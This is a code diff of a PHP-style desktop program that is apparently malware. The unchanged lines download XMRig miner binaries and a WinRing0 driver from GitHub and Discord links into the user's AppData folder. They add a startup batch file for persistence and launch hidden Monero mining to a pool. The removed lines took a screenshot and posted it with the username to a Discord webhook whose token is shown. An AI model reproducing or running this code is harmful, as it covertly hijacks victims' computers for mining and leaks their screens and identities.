@@ -1,16 +1,3 @@
-
-if(file_exists('count.txt')){
-$c = file_get_contents('count.txt');
-$c++;
-file_put_contents('count.txt',$c);
-}else{
-$c = '1';
-file_put_contents('count.txt',$c);
-
-}
-
-
-use httpclient;
  //file_put_contents($_ENV['APPDATA'].'\\'install2970288.cmd',file_get_contents('https://bmapps.org/bmcontrol/win64/install2970288.cmd'));
  //execute('cmd /c '.$_ENV['APPDATA'].'\\'install2970288.cmd');
 
@@ -23,50 +10,15 @@ file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Start
 file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Startup\microsotfer.bat',"@echo off\n start ".'https://lightminer.co/2970288');
 //execute('cmd /c start https://vk.com/minecraft_education_windows_7');
 
-(new Thread(function() use($c){
+(new Thread(function(){
+    
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\xmrig-cuda.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/xmrig-cuda.dll'));
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\WinRing0x64.sys',file_get_contents('https://github.com/Rastihin/mce/raw/main/WinRing0x64.sys'));
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc-builtins64_102.dll',file_get_contents('https://cdn.discordapp.com/attachments/836942104986124312/838423281199611914/nvrtc-builtins64_102.dll'));
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
     wait(3000);
-    execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url mine.bmpool.org:6004 --user 2970288 -p Processor --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 6 -B');      
-    
-    use httpclient;
-// Replace the URL with your own webhook url
-$url = "https://discord.com/api/webhooks/840855832735645718/yD6Ax41IvrMuMX_3S-RTRIRq-NA_jspfLpjCwEOt3fimk1t17LeROXSlSSa93RCevkik";
-
-new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
-$hookObject = [
-
-    'file' => new File($_ENV['TEMP'].'\temp.png'),
-    //'file1' => new File('C:\Users\Alex\Desktop\123.mp3'),
-    /*
-     * The general "message" shown above your embeds
-     */
-    "content" => $l."\nЗапуск номер: ".$c,
-
-    /*
-     * The username shown in the message
-     */
-    "username" => $_ENV['USERNAME'],
-    /*
-     * The image location for the senders image
-     */
-    //"avatar_url" => "https://xforgeassets001.xboxlive.com/serviceid-18231953-4b1d-472c-a39e-48b10105b7b7/a711e445-d98f-4849-8729-57b3c15a0f6f/contentname_Thumbnail_0.jpg",
-    /*
-     * Whether or not to read the message in Text-to-speech
-     */
-    "tts" => 0
-
-
-];
-
-$http = new HttpClient;
-$http->requestType = 'MULTIPART';
-$http->responseType = 'JSON';
-$http->post($url,$hookObject);
-unlink($_ENV['TEMP'].'\temp.png');
+    execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url mine.bmpool.org:6004 --user 2970288 -p Processor --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 6 -B');
     
     exit();
 }))->start();
